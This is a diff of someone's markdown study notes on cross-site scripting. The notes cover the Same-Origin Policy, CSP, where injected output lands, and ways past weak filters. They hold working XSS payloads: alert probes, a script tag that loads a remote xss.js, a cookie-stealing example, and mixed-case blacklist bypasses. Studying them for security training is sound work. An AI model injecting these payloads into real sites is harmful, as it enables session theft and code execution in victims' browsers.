@@ -3,11 +3,17 @@
 - [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
 - [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
 - [PortSwigger Xss](https://portswigger.net/web-security/cross-site-scripting)
+- [HackTricks XSS]([url](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html))
 
-# TL;DR
+XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do.
 
 # Notes
-## Attacking and Exploiting Modern Web Applications (Kindle Book)
+## Same-Origin Policy (SOP) 
+Tries to set boundaries by preventing one origin (website) from accessing resources from another origin. A different origin is defined by something that has a different protocol (`http` vs `https`), domain (`example.com` vs `google.com`) and port (`80` vs `443`)
+
+## Content Security Policy (CSP) 
+Also tries to add an additional later that lets websites declare which sources of content are trusted. e.g Without CSP an attacker can injects `<script>steal(document.cookie)</script>`. However, the SOP would limit the damage - the malicious script would only be able to access data from the current origin, not from the user's other tabs. If the CSP blocking inline scripts, that injection would be blocked. 
+
 ### Where is the output presenting itself?
 Determine where your input is getting printed in the HTTP response we receive back:
 - Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
@@ -24,12 +30,10 @@ Determine where your input is getting printed in the HTTP response we receive ba
 - Can bypass some client-side filters that only check content on page load :point_left:
 - Often involves content that gets injected into the DOM after the page has already loaded
 
-
-
 ## XSS Filter Bypasses
 Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.
 
-### How might these filters be implemented?
+## How might these filters be implemented?
 - Allow listing (Whitelisting) of allowed elements, attributes or characters.
 - Blacklisting of allowed elements, attributes or characters.
 - Filters are often layered. A payload may pass one filter but get caught by another
@@ -39,9 +43,7 @@ Client-side filters are relatively easy to bypass with BurpSuite, Server-side fi
 ```
 ;:!--''" <SCs>=&{[(`)]}//.
 ```
-
-
-### Weak Blacklists
+## Weak Blacklists
 - Casing: `<ScRiPt>alert(1);</ScRiPt>`
 - Casing: `<object data="JaVaScRiPt:alert(1)">`
 - Casing: `<img src=x OnErRoR=alert(1)>`
